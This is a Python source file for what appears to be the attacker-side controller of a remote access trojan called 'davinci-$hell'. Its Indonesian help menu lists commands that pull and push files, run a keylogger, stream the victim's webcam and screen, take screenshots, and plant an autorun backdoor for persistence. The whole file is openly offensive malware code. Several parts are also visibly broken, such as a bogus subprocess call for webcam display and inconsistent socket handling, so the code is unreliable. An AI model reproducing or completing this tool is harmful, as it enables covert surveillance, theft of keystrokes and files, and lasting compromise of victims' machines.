from socket import *
from halo import Halo
import os, sys, numpy as np, cv2 as c, pickletools as pt, threading as t
B = '\u001b[94m'
W = '\u001b[37m'
R = '\u001b[91m'
G = '\u001b[92m'
ER = f'[{R}!{W}] {R}'
banner = f"""{B}
      ___________________________
    < coded by: nur muhammad wafa >
      ---------------------------
            \   ^__^
             \  (oo)\_______
              \ (__)\       )\\
                    ||----ω |
                    ||     ||

    """
spinner = Halo(spinner='point', color='magenta')
def main():
    global ip_address, _target
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    try:
        ip_address = gethostbyname_ex(gethostname())[2][0]
        if ip_address == '127.0.0.1':
            raise Exception()
    except:
        ip_address = input(f'[{G}?{W}] Enter your IP address to bind >> ')
    port = 55550
    soc = socket()
    try:
        soc.bind((ip_address, port))
        spinner.start(f"Listening for Connections on {ip_address}:{port}")
        soc.listen(1)
        print(f'[{G}+{W}] Connected To : {(_target := soc.accept())[1]}')
    except OSError:
        sys.exit(f'{ER}IP address does not match device{W}')
def data_diterima():
    return _target[0].makefile(mode='rw').readline()
def download_file(namafile):
    with open(namafile, 'wb') as file:
        _target[0].settimeout(1)
        try:
            _target[0].recv_into(file)
        except timeout:
            pass
        _target[0].settimeout(None)
def upload_file(namafile):
    with open(namafile, 'rb') as file:
        _target[0].sendfile(file)
import subprocess
def konversi_byte_stream():
    sock = socket()
    sock.bind((ip_address, 55551))
    sock.listen(5)
    tgt = sock.accept()
    bytedata = bytearray(4*1024)
    while True:
        n = tgt.recv_into(bytedata)
        if not n: break
        msg_size, pos = pt.genops(bytedata)[0][2]
        frame_data = memoryview(bytedata)[pos:pos+msg_size]
        subprocess.run(["c", "imshow", "Memulai kamera...", frame_data])
        if c.waitKey(1) == 27: break
    tgt.close()
    c.destroyAllWindows()
def start_cam():
    t.Thread(target=konversi_byte_stream).start()
def konversi_byte_screen_recorder():
    sock = socket()
    sock.bind((ip_address, 55552))
    sock.listen(5)
    tgt, ip = sock.accept()
    bytedata = bytearray(4*1024)
    while True:
        n = tgt.recv_into(bytedata)
        if not n: break
        msg_size, pos = pt.genops(bytedata)[0][2]
        frame_data = memoryview(bytedata)[pos:pos+msg_size]
        frame = np.frombuffer(frame_data, dtype=np.uint8).reshape(480, 640, 3)
        c.imshow("Memulain layar...", frame)
        if c.waitKey(1) == 27: break
    tgt.close()
    c.destroyAllWindows()
def rekam_layar():
    t.Thread(target=konversi_byte_screen_recorder).start()
def help():
    print('\nhelp\t\t' , ': Untuk melihat list perintah')
    print('download\t' , ': Mengunduh file dari target [ex: download game.py ]')
    print('upload\t\t' , ': Mengunggah file ke terget [ex: upload game.py]')
    print('start_logger\t' , ': Memulai keylogger pada target')
    print('read_logger\t' , ': Membaca keylogger yang tersimpan')
    print('stop_logger\t' , ': Menghentikan keylogger dan hapus log otomatis')
    print('start_cam\t' , ': Memulai kamera pada komputer target [esc untuk close]')
    print('screenshot\t' , ': Mengambil tangkapan layar komputer target')
    print('persistence\t' , ': Menanamkan backdoor pada target agar autorun [ex: persistence security WinSec.exe]')
    print('screen_share\t' , ': Membagikan layar komputer target ke lhost secara langsung [esc untuk close]')
    print('exit/quit\t' , ': Keluar dari shell\n')
def komunikasi_shell():
    n = 0; fungsi = {
        'exit': lambda: exit(),
        'quit': lambda: exit(),
        'clear': lambda: os.system('cls' if os.name == 'nt' else 'clear'),
        'cd ': lambda: None,
        'download': lambda: download_file(perintah[9:]),
        'upload': lambda: upload_file(perintah[7:]),
        'start_logger': lambda: None,
        'read_logger': lambda: print(_target.recv(1024).decode()),
        'stop_logger': lambda: None,
        'start_cam': lambda: start_cam(),
        'screenshot': lambda: screenshot(n),
        'persistence': lambda: None,
        'screen_share': lambda: rekam_layar(),
        'help': lambda: help()
    }
    while True:
        perintah = input('davinci-$hell>> ')
        file = _target.makefile(mode='rw')
        file.write(perintah + '\n')
        file.flush()
        if perintah in ('exit', 'quit'):
            print(f'{ER} Connection closed'); spinner.start(f'\n{G} ^‿^ {B}Bye{W}\n'); t.sleep(3); break
        else:
            fungsi.get(perintah, lambda: print(file.readline()))()
def screenshot(n):
    n += 1; file = open("ss"+str(n)+".png", 'wb'); _target.settimeout(3); buffer = bytearray(1024)
    while True:
        n = _target.recv_into(buffer)
        if not n: break
        file.write(memoryview(buffer)[:n])
    _target.settimeout(None); file.close()
main()
komunikasi_shell()